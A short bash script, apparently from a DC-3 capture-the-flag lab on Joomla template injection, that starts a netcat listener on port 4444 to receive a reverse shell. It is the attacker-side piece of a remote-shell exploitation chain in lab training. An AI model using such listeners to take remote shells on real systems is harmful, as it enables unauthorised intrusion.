#!/bin/bash
###############################################################################
# Netcat Listener for Reverse Shell
# DC-3 CTF - Joomla Template Injection
###############################################################################

PORT=4444

echo "[*] Starting netcat listener on port $PORT"
echo "[*] Waiting for reverse shell connection..."
echo "[*] Press Ctrl+C to exit"
echo ""

nc -lvnp $PORT